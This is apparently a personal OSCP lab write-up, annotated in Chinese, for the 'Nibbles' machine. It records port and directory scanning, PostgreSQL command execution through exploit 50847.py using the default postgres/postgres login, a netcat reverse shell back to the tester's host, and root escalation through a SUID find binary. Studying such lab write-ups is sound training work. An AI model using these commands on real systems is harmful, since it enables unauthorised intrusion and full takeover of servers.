## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nibbles]
└─$ sudo nmap -A -sV -sS -T4 192.168.155.47
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-20 17:53 CST
Nmap scan report for 192.168.155.47
Host is up (0.36s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE  SERVICE      VERSION
21/tcp  open   ftp          vsftpd 3.0.3
22/tcp  open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp  open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp closed netbios-ssn
445/tcp closed microsoft-ds
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Linux 3.4 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 3.10 (87%), Linux 2.6.32 or 3.10 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   409.55 ms 192.168.45.1
2   409.54 ms 192.168.45.254
3   409.74 ms 192.168.251.1
4   409.80 ms 192.168.155.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.00 seconds
```

### Dirsearch

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nibbles]
└─$ dirsearch -u http://192.168.155.47/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

Output File: /home/ouyang/.dirsearch/reports/192.168.155.47/-_23-08-20_18-03-44.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-08-20_18-03-44.log

Target: http://192.168.155.47/

[18:03:45] Starting:
[18:04:00] 403 -  279B  - /.ht_wsr.txt
[18:04:00] 403 -  279B  - /.htaccess.bak1
[18:04:00] 403 -  279B  - /.htaccess.save
[18:04:00] 403 -  279B  - /.htaccess.orig
[18:04:00] 403 -  279B  - /.htaccess.sample
[18:04:01] 403 -  279B  - /.htaccess_extra
[18:04:01] 403 -  279B  - /.htaccess_orig
[18:04:01] 403 -  279B  - /.htaccessBAK
[18:04:01] 403 -  279B  - /.htaccessOLD
[18:04:01] 403 -  279B  - /.htaccessOLD2
[18:04:01] 403 -  279B  - /.htaccess_sc
[18:04:01] 403 -  279B  - /.htpasswds
[18:04:01] 403 -  279B  - /.htm
[18:04:01] 403 -  279B  - /.html
[18:04:01] 403 -  279B  - /.htpasswd_test
[18:04:01] 403 -  279B  - /.httr-oauth
[18:06:20] 200 -    1KB - /index.html
[18:07:08] 403 -  279B  - /server-status
[18:07:08] 403 -  279B  - /server-status/

Task Completed
```

	重連 VPN，IP 換成 192.168.187.47

重跑一次 nmap 發現 5437 port 也有開

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nibbles]
└─$ nmap 192.168.187.47 -p 1-65535 -sV -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-21 21:11 CST
Nmap scan report for 192.168.187.47
Host is up (0.29s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 396.17 seconds
```

用 searchsploit 搜尋是否有漏洞，發現 50847.py 可能可利用，但需要 authenticated，下載後透過預設 postgres/postgres 嘗試

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nibbles]
└─$ python3 50847.py -i 192.168.187.47 -p 5437 -c whoami

[+] Connecting to PostgreSQL Database on 192.168.187.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _3826e800e4783e61641b818ce2bca917
[+] Command executed

postgres

[+] Deleting table _3826e800e4783e61641b818ce2bca917
```

成功執行 command!

嘗試執行 nc 回彈 shell (只有 80 port 能成功，應有 firewall 阻擋)
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nibbles]
└─$ python3 50847.py -i 192.168.187.47 -p 5437 -c 'nc 192.168.45.181 80 -e /bin/bash'

[+] Connecting to PostgreSQL Database on 192.168.187.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _30046d8213cbf4875e693e654d24e98a
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Nibbles]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.181] from (UNKNOWN) [192.168.187.47] 36776
whoami
postgres
cd ~
ls
11
pwd
/var/lib/postgresql
cd /home
ls
wilson
cd wilson
ls
ftp
local.txt
cat local.txt
754d69978abe54a43629031427fb65c2
python -c 'import pty;pty.spawn("/bin/bash")'
postgres@nibbles:/home/wilson$
```

成功！！！

### 提權

透過 linpeas.sh，發現 find 具有 suid 權限

```json
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 35K Jan  7  2019 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
-rwsr-xr-x 1 root root 154K Feb  2  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
```

[gtfobins](https://gtfobins.github.io/gtfobins/find/)

嘗試利用！

```json
postgres@nibbles:/home/wilson$ cd /usr/bin
cd /usr/bin
postgres@nibbles:/usr/bin$ ls | grep find
ls | grep find
find
findaffix
findmnt
findsmb
postgres@nibbles:/usr/bin$ ./find . -exec /bin/sh -p \; -quit
./find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
#
```

成功！